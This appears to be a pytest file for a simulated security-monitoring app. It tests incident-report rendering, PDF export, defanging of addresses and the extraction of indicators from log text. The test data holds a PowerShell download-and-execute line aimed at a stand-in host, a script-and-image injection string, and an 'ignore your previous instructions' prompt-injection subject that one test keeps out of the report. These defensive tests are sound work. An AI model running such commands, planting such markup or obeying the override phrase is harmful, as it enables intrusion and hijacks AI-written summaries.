"""Tests for the incident report and the indicators it lists.

Most of these check the report's HTML, which is built anywhere. Turning the
HTML into a PDF needs WeasyPrint's system libraries: that one test runs in
Docker and on GitHub, and is skipped on a computer without them.
"""

import os
from datetime import datetime, timedelta, timezone

import pytest

from backend import main
from backend.models import Alert, IncidentDetail, IncidentInfo, Indicator, TimelineStep
from backend.reports import indicators, report
from backend.simulator import events, phishing

T = datetime(2026, 11, 27, 12, 0, tzinfo=timezone.utc)
CREATED = datetime(2026, 11, 27, 21, 15, tzinfo=timezone.utc)
SUMMARY_URL = "/api/incidents/1/summary"


def report_html(session, incident_id: int = 1) -> str:
    """The report as the API would build it, from what is stored now."""
    session.expire_all()  # forget anything read before the API changed it
    detail = main._incident_detail(session, incident_id)
    return report.render_html(detail, main._get_summary(session, incident_id), CREATED)


def alert_of(client, rule_id: str) -> dict:
    alerts = client.get("/api/alerts").json()["alerts"]
    return next(alert for alert in alerts if alert["rule_id"] == rule_id)


# ----------------------------------------------------------------- The report


def test_the_report_has_every_section(client, session):
    client.post("/api/simulate/full_chain")
    client.post(SUMMARY_URL)  # the stored demo summary
    html = report_html(session)

    for heading in ("Incident #1", "Executive summary", "Timeline", "Affected hosts and users",
                    "Indicators of compromise", "MITRE ATT&amp;CK techniques", "Recommended actions",
                    "Containment", "Eradication and recovery"):
        assert heading in html
    # The facts, the story and the steps.
    assert "9 alerts on WKS-FIN-03 involving a.khan, " in html
    assert "28 minutes" in html
    assert "one attack that ran from a phishing email to stolen data" in html
    assert "Incident severity: Critical." in html
    assert "Disconnect WKS-FIN-03 from the network now" in html
    assert "Rebuild WKS-FIN-03 from a clean image" in html
    # The timeline, the tactics in order and the techniques.
    for title in ("Macro-Enabled Office Attachment From An External Sender", "Large Upload To A Public IP Address"):
        assert title in html
    assert html.index("<li>Initial Access</li>") < html.index("<li>Persistence</li>") < html.index("<li>Exfiltration</li>")
    assert "T1566.001" in html and "Spearphishing Attachment" in html
    # It says who wrote the summary, when it was made and that the data is simulated.
    assert "AI-written draft. An analyst has not reviewed it yet." in html
    assert "stored example answer, not a live AI call" in html
    assert "27 November 2026 at 21:15 UTC" in html
    assert "its logs are simulated" in html


def test_addresses_are_defanged_everywhere_in_the_report(client, session):
    client.post("/api/simulate/full_chain")
    client.post(SUMMARY_URL)
    html = report_html(session)
    assert "hxxp://198[.]51[.]100[.]23/update[.]ps1" in html
    assert "accounts@c0rp[.]example" in html
    # Not in the table, and not in the summary or the steps either.
    for live in (events.ATTACKER_SERVER, "http://", "c0rp.example"):
        assert live not in html


def test_log_text_cannot_become_html():
    # A host name, a sender and a file name chosen by an attacker to inject
    # tags into the report.
    hostile = '<img src="http://198.51.100.9/track.png"><script>alert(1)</script>'
    alert = Alert(
        id=1, time=T, rule_id="rule", title="An alert", severity="High", attack_tactics=["Execution"],
        attack_techniques=["T1059.001"], host=hostile, user=hostile, log_ids=[],
    )
    detail = IncidentDetail(
        incident=IncidentInfo(
            id=1, start_time=T, end_time=T, severity="High", status="Open", hosts=[hostile], users=[hostile],
            tactics=["Execution"], alerts=1, open_alerts=1,
        ),
        timeline=[TimelineStep(alert=alert, evidence=None)],
        techniques=[],
        indicators=[Indicator(kind="File name", value=hostile, alert_id=1, alert_title=hostile)],
    )
    html = report.render_html(detail, None, CREATED)
    assert "<img" not in html and "<script" not in html
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html  # shown as the text it is


def test_the_injected_email_subject_is_not_in_the_report(client, session):
    client.post("/api/simulate/phishing")
    client.post(SUMMARY_URL)
    html = report_html(session)
    assert "ignore your previous instructions" not in html
    assert phishing.INJECTION not in html


def test_without_an_ai_summary_the_report_is_built_from_the_facts(client, session):
    client.post("/api/simulate/brute_force")
    html = report_html(session)  # nobody has asked for a summary
    assert "There is no AI summary for this incident" in html
    assert "Sentinel grouped 2 alerts into this incident" in html
    assert "involving the host SRV-RDP-01 and the user s.ahmed" in html
    assert "2 MITRE ATT&amp;CK tactics: Credential Access, Initial Access" in html
    assert "Incident severity: High." in html
    for step in report.GENERAL_CONTAINMENT + report.GENERAL_RECOVERY:
        assert step.split(".")[0] in html
    assert "AI-written" not in html
    assert "203[.]0[.]113[.]77" in html


def test_the_report_uses_the_analysts_version_once_reviewed(client, session):
    client.post("/api/simulate/exfiltration")
    suggested = client.post(SUMMARY_URL).json()["summary"]
    mine = {name: suggested[name] for name in ("severity", "summary", "containment", "recovery")}

    client.patch(SUMMARY_URL, json=mine)  # accepted as written
    html = report_html(session)
    assert "Written by AI, then reviewed and accepted by the analyst." in html
    assert "Incident severity: Critical." in html
    assert "cannot be undone" in html  # the AI's reason for Critical

    client.patch(SUMMARY_URL, json={
        **mine, "severity": "High", "summary": "An approved backup ran late.",
        "containment": [], "recovery": ["Add the backup server to the rule's filter."],
    })
    html = report_html(session)
    assert "Written by the analyst, starting from an AI draft." in html
    assert "An approved backup ran late." in html
    assert "Incident severity: High." in html
    assert "cannot be undone" not in html  # the AI's reason was for a severity the analyst changed
    assert "The analyst listed no containment steps." in html
    assert "Add the backup server to the rule&#39;s filter." in html
    assert "Search the firewall logs for other machines" not in html  # the AI's own steps are gone


def test_false_positives_are_left_out_of_the_report(client, session):
    client.post("/api/simulate/full_chain")
    upload = alert_of(client, "fw_large_upload_to_public_ip")
    client.patch(f"/api/alerts/{upload['id']}", json={"status": "Closed as false positive"})
    html = report_html(session)
    assert upload["title"] not in html
    assert "1 alert was closed as\n    a false positive" in html
    assert "FTP Connection To A Public IP Address" in html  # the other eight are still there

    # With every alert closed as a false positive, the report says so and
    # records what the rules saw.
    for alert in client.get("/api/alerts").json()["alerts"]:
        client.patch(f"/api/alerts/{alert['id']}", json={"status": "Closed as false positive"})
    html = report_html(session)
    assert "closed every alert in this incident as a false positive" in html
    assert upload["title"] in html


def test_durations_read_naturally():
    assert report.duration(timedelta(seconds=20)) == "under a minute"
    assert report.duration(timedelta(minutes=1)) == "1 minute"
    assert report.duration(timedelta(minutes=28)) == "28 minutes"
    assert report.duration(timedelta(hours=1)) == "1 hour"
    assert report.duration(timedelta(hours=2, minutes=5)) == "2 hours 5 minutes"


# -------------------------------------------------------------------- The PDF


def test_the_report_prints_to_a_pdf(client, session):
    client.post("/api/simulate/full_chain")
    client.post(SUMMARY_URL)
    try:
        pdf = report.to_pdf(report_html(session))
    except report.Unavailable as reason:
        if os.environ.get("CI"):
            raise  # on GitHub the PDF must really be made: a missing library is a failure there
        pytest.skip(str(reason))
    assert pdf.startswith(b"%PDF-")
    assert len(pdf) > 5_000  # three pages of text and tables, not an empty sheet


def test_download_report_answers_with_a_pdf_file(client, monkeypatch):
    client.post("/api/simulate/full_chain")
    printed = []
    monkeypatch.setattr(report, "to_pdf", lambda html: printed.append(html) or b"%PDF-1.7 a test page")

    response = client.get("/api/incidents/1/report.pdf")
    assert response.status_code == 200
    assert response.headers["content-type"] == "application/pdf"
    assert response.headers["content-disposition"] == 'attachment; filename="sentinel-incident-1.pdf"'
    assert response.content == b"%PDF-1.7 a test page"
    assert "Incident #1" in printed[0]
    # Asking for the report does not ask the AI for a summary: that would be
    # a download quietly spending money.
    assert "There is no AI summary for this incident" in printed[0]


def test_where_pdfs_cannot_be_made_the_app_says_so(client, monkeypatch):
    def no_weasyprint(html):
        raise report.Unavailable("PDF reports need WeasyPrint's system libraries.")

    monkeypatch.setattr(report, "to_pdf", no_weasyprint)
    client.post("/api/simulate/full_chain")
    response = client.get("/api/incidents/1/report.pdf")
    assert response.status_code == 503
    assert "WeasyPrint" in response.json()["detail"]
    # Everything else about the incident still works.
    assert client.get("/api/incidents/1").status_code == 200


# ------------------------------------------------------------- The indicators


def evidence(fields: dict, source: str = "PowerShell", event_id: int | None = 4104):
    """One alert, and the one log line that is its evidence."""
    log = events._log(T, "WKS-FIN-03", "a.khan", source, event_id, "Test.", fields, "test")
    log.id = 1
    alert = Alert(
        id=1, time=T, rule_id="rule", title="An alert", severity="High", attack_tactics=["Execution"],
        attack_techniques=["T1059.001"], host=log.host, user=log.user, log_ids=[1],
    )
    return [alert], {1: log}


def found(fields: dict, **log) -> list[tuple[str, str]]:
    return [(indicator.kind, indicator.value) for indicator in indicators.find(*evidence(fields, **log))]


def test_only_outside_addresses_are_indicators():
    assert found({"DestinationIp": "198.51.100.23"}) == [("IP address", "198.51.100.23")]
    for ours in ("10.0.20.13", "172.16.4.4", "192.168.1.10", "127.0.0.1", "-", ""):
        assert found({"DestinationIp": ours, "IpAddress": ours, "dst_ip": ours}) == []


def test_web_addresses_are_found_inside_text():
    script = "IEX (New-Object Net.WebClient).DownloadString('https://files.bad.example/a.ps1'); echo done"
    assert found({"ScriptBlockText": script}) == [
        ("Domain", "files.bad.example"),
        ("URL", "https://files.bad.example/a.ps1"),
    ]
    # An internal web address is listed, but its server is not an indicator.
    assert found({"ScriptBlockText": "curl http://10.0.0.5/tool"}) == [("URL", "http://10.0.0.5/tool")]


def test_hostile_log_text_cannot_break_the_indicator_search():
    # A malformed address must not crash the incident page.
    assert found({"ScriptBlockText": "Invoke-WebRequest http://[oops/x"}) == [("URL", "http://[oops/x")]
    # An enormous value is cut to a sensible length.
    ((kind, value),) = found({"attachment": "A" * 5000})
    assert (kind, len(value)) == ("File name", indicators.MAX_LENGTH)
    # A log line with no fields at all is fine too.
    assert found({}) == []


def test_a_new_account_is_an_indicator_only_when_it_was_created():
    created = {"SubjectUserName": "a.khan", "TargetUserName": "svc_update"}
    assert found(created, source="Windows Security", event_id=4720) == [("Account created", "svc_update")]
    # The same field on a logon event is just who logged on.
    assert found(created, source="Windows Security", event_id=4624) == []


def test_defanging_makes_addresses_unclickable():
    def defanged(kind: str, value: str) -> str:
        return indicators.defang(Indicator(kind=kind, value=value, alert_id=1, alert_title="t"))

    assert defanged("URL", "http://198.51.100.23/update.ps1") == "hxxp://198[.]51[.]100[.]23/update[.]ps1"
    assert defanged("URL", "https://files.bad.example/a") == "hxxps://files[.]bad[.]example/a"
    assert defanged("IP address", "203.0.113.77") == "203[.]0[.]113[.]77"
    assert defanged("Email address", "accounts@c0rp.example") == "accounts@c0rp[.]example"
    # File and account names are not addresses, so they are left as they are.
    assert defanged("File name", "Invoice_INV-20481.docm") == "Invoice_INV-20481.docm"
    assert defanged("Account created", "svc_update") == "svc_update"
